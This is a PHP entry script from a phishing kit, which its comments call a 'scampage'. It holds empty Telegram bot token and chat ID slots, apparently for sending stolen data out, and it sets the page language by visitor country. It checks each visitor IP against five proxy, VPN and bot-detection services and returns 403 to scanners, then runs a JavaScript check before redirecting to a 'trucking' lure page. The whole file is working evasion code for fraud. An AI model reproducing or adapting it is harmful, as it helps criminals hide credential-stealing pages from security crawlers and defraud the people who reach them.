<?php
session_start();




// ----------------- CONFIG -----------------
$TEST_MODE = false; // Set to false in production
// Please if you want to test your scampage on localhost set to true
// ATTENTION !! do not forget to set to false if you upload it to real server cause it will be vulnurable to bots 
// and your scampage will be detected easily.
// ------------------------------------------


// Telegram bot config
$botToken = ''; // Telegram token
$chatId   = ''; // Telegram Chat ID

// Store in session
$_SESSION['botToken'] = $botToken;
$_SESSION['chatId']   = $chatId;

// ----------------- FUNCTIONS -----------------

// Get client IP
function get_client_ip(): string {
    global $TEST_MODE;
    if ($TEST_MODE) return '1.2.3.4'; // fake public IP for testing
    $keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            $ip = trim($ipList[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return '127.0.0.1';
}

// Get real IP for bot checks
function getRealIpAddr() {
    global $TEST_MODE;
    if ($TEST_MODE) return '1.2.3.4';
    $headers = [
        'HTTP_CLIENT_IP', 
        'HTTP_X_FORWARDED_FOR', 
        'HTTP_X_FORWARDED', 
        'HTTP_X_CLUSTER_CLIENT_IP', 
        'HTTP_FORWARDED_FOR', 
        'HTTP_FORWARDED', 
        'REMOTE_ADDR'
    ];
    foreach ($headers as $header) {
        if (isset($_SERVER[$header]) && filter_var($_SERVER[$header], FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
            return $_SERVER[$header];
        }
    }
    return $_SERVER['REMOTE_ADDR'];
}

// Country → language mapping
function country_to_lang(string $country): string {
    $map = [
        'US' => 'en', 'GB' => 'en',
        'ES' => 'es', 'MX' => 'es', 'AR' => 'es',
        'FR' => 'fr',
        'DE' => 'de', 'AT' => 'de', 'CH' => 'de',
        'FI' => 'fi',
        'SE' => 'sv',
        'NO' => 'no',
    ];
    $country = strtoupper($country);
    return $map[$country] ?? 'en';
}

// Fetch country code from ipapi.co
function fetch_country_code(string $ip): ?string {
    if (in_array($ip, ['127.0.0.1', '::1'])) return null;
    $json = @file_get_contents("https://ipapi.co/{$ip}/json/");
    if (!$json) return null;
    $data = @json_decode($json, true);
    return $data['country_code'] ?? null;
}

// Validate language
function is_valid_lang(string $lang): bool {
    $allowed = ['de','en','es','fi','fr','no','sv'];
    return in_array($lang, $allowed, true);
}

// ----------------- LANGUAGE HANDLING -----------------

if (!empty($_GET['lang']) && is_valid_lang($_GET['lang'])) {
    $_SESSION['lang'] = $_GET['lang'];
} elseif (empty($_SESSION['lang'])) {
    $ip = get_client_ip();
    $country = fetch_country_code($ip);
    $_SESSION['lang'] = country_to_lang($country ?? '');
}

if (!is_valid_lang($_SESSION['lang'] ?? '')) {
    $_SESSION['lang'] = 'en';
}

// ----------------- BOT CHECK CLASS -----------------
class Bot {
    const api1 = "https://blackbox.ipinfo.app/lookup/";
    const api2 = "http://check.getipintel.net/check.php?ip=";
    const api3 = "https://ip.teoh.io/api/vpn/";
    const api4 = "http://proxycheck.io/v2/";
    const api5 = "https://v2.api.iphub.info/guest/ip/";
    const block = "BLOCK";
    const allow = "ALLOW";

    private function __curl($url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        curl_close($ch);
        return $output ?: false;
    }

    private function __jsondecode($json) {
        return json_decode($json);
    }

    public function proxy1($ip) { return $this->__curl(self::api1.$ip)==="Y"?self::block:self::allow; }
    public function proxy2($ip) { return ((float)$this->__curl(self::api2.$ip."&contact=test".rand(1000,9999)."@domain.com")>=0.99)?self::block:self::allow; }
    public function proxy3($ip) { $json = $this->__jsondecode($this->__curl(self::api3.$ip)); return (isset($json->risk)&&$json->risk=="high")?self::block:self::allow; }
    public function proxy4($ip) { $json = $this->__jsondecode($this->__curl(self::api4.$ip."&risk=1&vpn=1")); return (isset($json->$ip->proxy)&&$json->$ip->proxy=="yes")?self::block:self::allow; }
    public function proxy5($ip) { $json = $this->__jsondecode($this->__curl(self::api5.$ip."?c=".md5(rand(0,11)))); return (isset($json->block)&&$json->block==1)?self::block:self::allow; }
    public function checkcountry($ip) { return $this->__jsondecode($this->__curl("http://ipinfo.io/{$ip}/json")); }
}

function isBot($bot,$ip) {
    return ($bot->proxy1($ip)===Bot::block||$bot->proxy2($ip)===Bot::block||$bot->proxy3($ip)===Bot::block||$bot->proxy4($ip)===Bot::block||$bot->proxy5($ip)===Bot::block);
}

// ----------------- MAIN -----------------
$ip = getRealIpAddr();
$bot = new Bot();

if (!$TEST_MODE) {
    if (isBot($bot,$ip)) {
        header("HTTP/1.1 403 Forbidden");
        header("Access-Denied: Bot");
        exit;
    }
    $_SESSION['is_human'] = true;
} else {
    $_SESSION['is_human'] = true; // test mode auto human
    $_SESSION['js_verified'] = true; // JS auto verified
}

// Redirect if already verified
if (isset($_SESSION['js_verified']) && $_SESSION['is_human']==true) {
    header("Location: ./trucking/");
    exit;
}

// If JS verify not set → redirect to ?verify_js=1
if (!isset($_GET['verify_js']) && !$TEST_MODE) {
    header("Location: ?verify_js=1");
    exit;
}

// Generate JS token if verify_js param
if (isset($_GET['verify_js'])) {
    $_SESSION['js_token'] = bin2hex(random_bytes(16));
}
?>

<?php if (isset($_GET['verify_js']) && !$TEST_MODE): ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Verifying...</title>
</head>
<body>
<noscript><p style="color:red;">⚠️ JavaScript is required to continue.</p></noscript>
<script>
const token = "<?php echo $_SESSION['js_token']; ?>";
fetch("verify_js_set_session.php", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ token: token })
})
.then(r=>r.json())
.then(data=>{
    if(data.status==="ok"){
        const url = window.location.href.replace("?verify_js=1","");
        window.location.href = url;
    } else {
        document.body.innerHTML="<p style='color:red;'>Verification failed ❌</p>";
    }
});
</script>
</body>
</html>
<?php endif; ?>
